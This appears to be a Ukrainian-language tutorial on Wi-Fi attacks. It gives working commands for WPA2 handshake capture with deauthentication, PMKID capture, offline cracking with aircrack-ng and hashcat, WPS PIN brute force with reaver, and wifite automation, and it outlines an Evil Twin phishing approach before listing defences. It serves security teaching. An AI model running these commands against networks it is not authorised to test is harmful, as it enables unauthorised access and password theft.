WPA/WPA2: 4-Way Handshake

WPA2 використовує 4-Way Handshake для встановлення ключа шифрування. Перехоплення handshake дозволяє офлайн-крекінг пароля.
AP
→ ANonce →
Client
→ SNonce →
AP
→ GTK →
Client
→ ACK →
AP

Як працює атака

  1. Перевести адаптер у Monitor Mode
  2. Сканувати мережі (airodump-ng)
  3. Перехопити handshake (чекати або deauth)
  4. Крекінг офлайн (aircrack-ng / hashcat)
# Monitor mode
airmon-ng start wlan0

# Сканування мереж
airodump-ng wlan0mon

# Захоплення handshake конкретної мережі
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w capture wlan0mon

# Деаутентифікація клієнта (прискорення)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

PMKID атака та крекінг

PMKID атака (2018) — не потребує підключеного клієнта! Достатньо першого пакета від AP.

PMKID (без клієнта!)

  • Виявлена hashcat-розробником Jens Steube (2018)
  • AP надсилає PMKID у першому повідомленні
  • PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
  • Не потрібен повний handshake
# Захоплення PMKID
hcxdumptool -i wlan0mon \
  --enable_status=1 -o capture.pcapng

# Конвертація
hcxpcapngtool -o hash.22000 capture.pcapng

Крекінг Wi-Fi паролів

# Aircrack-ng (CPU)
aircrack-ng -w rockyou.txt capture-01.cap

# Hashcat (GPU) — WPA-PBKDF2
hashcat -m 22000 hash.22000 rockyou.txt

# Hashcat з правилами
hashcat -m 22000 hash.22000 rockyou.txt \
  -r best64.rule
Обмеження: WPA2 використовує PBKDF2 (4096 ітерацій) — RTX 4090: ~2.5 млн хешів/сек. 8-символьний пароль (a-z) ≈ 23 години.

WPS, Evil Twin та автоматизація

WPS PIN атака

  • WPS PIN — 8 цифр (реально 11,000 комбінацій)
  • Reaver: brute-force WPS PIN
# Пошук AP з WPS
wash -i wlan0mon

# Атака на WPS PIN
reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF -vv

# Bully (альтернатива)
bully wlan0mon -b BSSID -vv

Час: 4-10 годин

Evil Twin (Fluxion)

  • Створити фейкову точку доступу
  • Деаутентифікувати жертву
  • Жертва підключається до фейкової AP
  • Captive portal збирає пароль
  • Соціальна інженерія, не брутфорс

Wifite2 (автоматизація)

  • Автоматичне сканування
  • Автоматичний вибір атаки
# Автоматична атака
wifite --kill

# Тільки WPA
wifite --wpa

# З конкретним словником
wifite --dict rockyou.txt

WPA3 та захист Wi-Fi

WPA3-SAE (Simultaneous Authentication of Equals)

  • Замість PSK — протокол Dragonfly
  • Захист від офлайн-атак на словник
  • Forward secrecy — компрометація пароля не розшифрує минулий трафік
  • Dragonblood (2019) — side-channel атаки на деякі реалізації (CVE-2019-9494)
  • Поки що обмежене поширення

Рекомендації захисту Wi-Fi

✓ Використовувати WPA3 або WPA2 з довгим паролем (12+ символів)
✓ Вимкнути WPS
✓ Змінити SSID за замовчуванням
✓ Фільтрація MAC (слабкий, але додатковий)
✓ RADIUS автентифікація (WPA2-Enterprise)
✓ Моніторинг rogue AP
✓ Регулярне оновлення firmware
